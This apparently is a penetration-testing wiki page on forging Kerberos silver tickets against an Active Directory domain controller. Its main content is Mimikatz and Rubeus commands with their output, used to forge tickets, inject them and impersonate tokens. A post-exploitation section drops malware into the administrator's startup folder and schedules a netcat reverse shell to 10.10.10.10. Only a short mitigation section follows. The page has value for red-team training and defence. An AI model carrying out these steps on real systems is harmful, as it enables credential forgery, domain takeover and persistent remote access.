---
description: https://attack.mitre.org/techniques/T1558/002/
---

# Silver Ticket

**ATT\&CK ID:** [T1158.002](https://attack.mitre.org/techniques/T1558/002/)

**Permissions Required:** <mark style="color:green;">**User**</mark>

**Description**

Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.

Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.

### Notes

* Silver ticket is a valid TGS where a Golden ticket is a TGT
* Encrypted and signed by the NTLM hash of the service account
* Services only allow access to the services themselves

## Techniques

### Scenario

* Domain Controller **(DC01)**
* Workstation **(Workstation-01)**

This scenario assumes compromise where the computer account hash for DC01$ has already been revealed through one of the many methods found in this [**Link**](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/golden-ticket#methods-of-krbtgt-hash-retrieval).

Here we are running as the local administrator on the **WS01** system. Attempting to list the directory contents of `C$` on the Domain Controller shows we are unable to do so (the local administrator has no permission over the C: drive on the DC).

![](<../../../../.gitbook/assets/image (2029).png>)

## Mimikatz (Method-01)

From the workstation we are able to make use of Mimikatz to forge a silver ticket using the NTLM machine account for the DC.

#### Command Breakdown

| Switch           | Description                                           |
| ---------------- | ----------------------------------------------------- |
| kerberos::golden | Module name                                           |
| /domain:         | Domain FQDN                                           |
| /sid:            | Domain SID                                            |
| /target:         | Target FQDN                                           |
| /service:        | SPN name of service to create TGS for                 |
| /rc4:            | NTLM  / RC4 hash of the service account (DC01)        |
| /aes265:         | AES265 hash if /rc4: is not going to be used          |
| /user:           | Username for which the TGT is generated (Can be fake) |
| /ptt             | Injects ticket into current process                   |

{% code title="Input (RC4)" overflow="wrap" %}
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:security.local /sid:S-1-5-21-3601687231-1513629788-1757802677 /target:dc01.security.local /service:CIFS /rc4:53b82af68b0faf6587971fe807fad960 /user:Viper /ptt"'
```
{% endcode %}

{% code title="Input (AES265)" overflow="wrap" %}
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:security.local /sid:S-1-5-21-3601687231-1513629788-1757802677 /target:dc01.security.local /service:CIFS /aes256:4d8daf60cf15651b283c9c180b04d4bd68a5b06592c0007697ae8de0700a21d5 /user:Viper /ptt"'
```
{% endcode %}

<pre data-title="Output"><code><strong>User      : Viper
</strong>Domain    : security.local (SECURITY)
SID       : S-1-5-21-3601687231-1513629788-1757802677
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 53b82af68b0faf6587971fe807fad960 - rc4_hmac_nt
Service   : CIFS
Target    : dc01.security.local
Lifetime  : 09/02/2023 13:21:08 ; 06/02/2033 13:21:08 ; 06/02/2033 13:21:08
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Viper @ security.local' successfully submitted for current session
</code></pre>

Now the ticket has been created and injected into the current process (`/ptt`) we can use the command below to open a new command prompt from Mimikatz whilst retaining the ticket.

<pre class="language-powershell"><code class="lang-powershell"><strong>Invoke-Mimikatz -Command "misc::cmd"
</strong></code></pre>

Next, use `klist` command to check if the ticket has retained in the new session

```
Current LogonId is 0:0x57cab

Cached Tickets: (1)

#0>     Client: Viper @ security.local
        Server: CIFS/dc01.security.local @ security.local
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 2/9/2023 13:21:08 (local)
        End Time:   2/6/2033 13:21:08 (local)
        Renew Time: 2/6/2033 13:21:08 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

We are then able to list the `C$` share of the Domain Controller.

```powershell
# CMD 
dir \\DC01.Security.Local\C$

# PowerShell
ls -force \\DC01.Security.Local\C$
```

{% code title="Output" %}
```powershell
<-- Snip -- >

 Directory of \\DC01.Security.Local\C$

22/12/2022  13:30    <DIR>          PerfLogs
22/12/2022  14:26    <DIR>          Program Files
25/01/2023  17:02    <DIR>          Program Files (x86)
26/01/2023  19:58    <DIR>          Users
03/01/2023  16:01    <DIR>          Windows
               0 File(s)              0 bytes
               5 Dir(s)  60,414,803,968 bytes free
               
<-- Snip -- >
```
{% endcode %}

Some examples commands which can now be performed on the domain controller

## Rubeus (Method-02)

Using Rubeus we can either forge the silver ticket and load into a separate session (cleaner) or forge the ticket and inject into the current process (may cause issues).

**Forge and inject directly into the current process**

{% code overflow="wrap" %}
```powershell
Rubeus.exe silver /service:cifs/dc01.security.local /aes256:f9647c8dba66c6576057167ab18d93582ea7fa1a8fd9b03b79d7d173644ff2e4 /user:Administrator /domain:security.local /sid:S-1-5-21-3601687231-1513629788-1757802677 /nowrap /ptt
```
{% endcode %}

**Forge and inject into new process**

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong># Forge silver ticket
</strong><strong>Rubeus.exe silver /service:cifs/dc01.security.local /aes256:f9647c8dba66c6576057167ab18d93582ea7fa1a8fd9b03b79d7d173644ff2e4 /user:Administrator /domain:security.local /sid:S-1-5-21-3601687231-1513629788-1757802677 /nowrap
</strong></code></pre>

{% code title="Input" overflow="wrap" %}
```bash
# Createnetonly process, username and password can be anything
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:Security.local /username:Administrator /password:NotRealPass
```
{% endcode %}

{% code title="Output" %}
```
[*] Action: Create Process (/netonly)
[*] Using Security.local\Administrator:NotRealPass

[*] Showing process : False
[*] Username        : Administrator
[*] Domain          : Security.local
[*] Password        : NotRealPass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 2080
[+] LUID            : 0x12e0ab8
```
{% endcode %}

Take note of the LUID value in the output above. We need to now inject the silver ticket we forged earlier into the new LUID session.

```bash
Rubeus.exe ptt /luid:0x12e0ab8 /ticket:doIFuj[...snip...]lDLklP
```

After the ticket has been imported into the new LUID session we then need to impersonate the process token using the `ProcessID` from the output above (2080).

```powershell
Invoke-SharpImpersonation -Command "pid:[PID]"
```

<figure><img src="../../../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

As above, checking `klist` shows the silver ticket has retained in our new shell process. We should now be able to list the contents of the Domain Controller's C: drive.

{% code title="Output" %}
```
 Directory of \\DC01.Security.Local\C$

22/12/2022  13:30    <DIR>          PerfLogs
22/12/2022  14:26    <DIR>          Program Files
25/01/2023  17:02    <DIR>          Program Files (x86)
26/01/2023  19:58    <DIR>          Users
03/01/2023  16:01    <DIR>          Windows
               0 File(s)              0 bytes
               5 Dir(s)  60,414,803,968 bytes free
```
{% endcode %}

## Empire (Method-03)

```
# PowerShell
powershell/credentials/mimikatz/silver_ticket
```

## Post Exploitation Techniques

{% code overflow="wrap" %}
```powershell
# Map drive
net use Z: \\dc01.security.local\C$

# Copy malware to Domain Administrator startup folder on DC
copy .\MaliciousFile.exe "\\dc01.security.local\c$\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

# CMD 
.\PsExec.exe -accepteula \\dc01.security.local cmd

# Netcat
schtasks /create /sc minute /mo 1 /tn "Persistence" /tr 'c:\Users\Administrator\Downloads/nc.exe 10.10.10.10 443 -e cmd.exe'
```
{% endcode %}

## Other ticket combinations

| Technique         | Required Service Ticket |
| ----------------- | ----------------------- |
| PSexec            | CIFS                    |
| WinRm             | HOST & HTTP             |
| DCSync (DCs only) | LDAP                    |

## Mitigation

Limit service accounts to minimal required privileges, including membership in privileged groups such as Domain Administrators.

If possible use [group managed service accounts](https://technet.microsoft.com/en-us/library/hh831782\(v=ws.11\).aspx?f=255\&MSPPError=-2147217396) which have random, complex passwords (>100 characters) and are managed automatically by Active Directory [\[source\]](https://adsecurity.org/?p=2293)

## References

{% embed url="https://adsecurity.org/?p=2011" %}
